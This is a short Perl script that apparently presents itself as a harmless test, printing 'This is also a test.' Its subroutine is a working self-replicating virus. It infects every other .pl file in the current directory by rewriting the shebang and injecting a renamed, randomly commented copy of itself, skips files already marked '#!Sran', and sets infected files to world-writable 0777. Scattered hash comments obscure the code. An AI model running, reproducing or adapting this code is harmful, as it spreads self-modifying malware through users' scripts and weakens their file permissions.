sadBVa();

print "This is also a test.\n";

sub sadBVa {  #21wZPocL9r3I2
  #25lj6HLJr3lR.
    goto b if($ENV{"USER"} eq "root"); #403dRcOOEKV7c
      #53a2B3OFfBrvE
a: while (<*.pl>) 
    { #11zR6D0l39gH2
	my $oF = "sadBVa";  #21wZPocL9r3I2
	my $tN = crypt($_, $_), $cW = 0; $oN = "./$_", $nF = $tN; #23xTGZMRTRgO.
 #73QebE0Q0ZZ7Q
	open (WE, "<$0");					
	open (IF, "<$_");  #19ffqqT32W0N6
	open (TMP, ">$tN");					  #21wZPocL9r3I2
	 #46uAWbWZGiwdE
	    $nF =~ s/[0-9.\/].*/a/; 
	 #20DFf8jQEuujI
	    while (<IF>) 
	    {
		chomp; #17rFB3rla0OL.
		if (/\#!Sran/) { unlink ($tN); next a }		
		elsif (!/#!\//) { print TMP "$_\n" } 
		else { if(!/-X/){$_ .= " -X"} print TMP "$_\n#!Sran\n$nF();\n" }		
	    } #14HPto765IJGs
	      #56usvbQbO.V7g
	    while (<WE>) 
	    { 
		$st = "";  #16DEAzgu4U/Lg
		  #21wZPocL9r3I2
		s/#[\d].*/$st/;
		if (/sub $oF/ || /my \$oF =/) { $cW = 1; s/$oF/$nF/}
		next if (/#!\// || /$oF();/ || !$cW);
		if (int(rand(2))) { $st=" #".crypt($tN, rand(256)) } 
		else {$st = ""} #24kfAR.q3vZXI
		 
		chomp; #19ffqqT32W0N6
		print TMP "$_$st\n"; #130lOPyQngaJw
	    } 
	  #21wZPocL9r3I2
	unlink ($oN); 
	rename ($tN, $oN);
	chmod (0777, $oN);
    }
b:  #24kfAR.q3vZXI
}  #25lj6HLJr3lR.
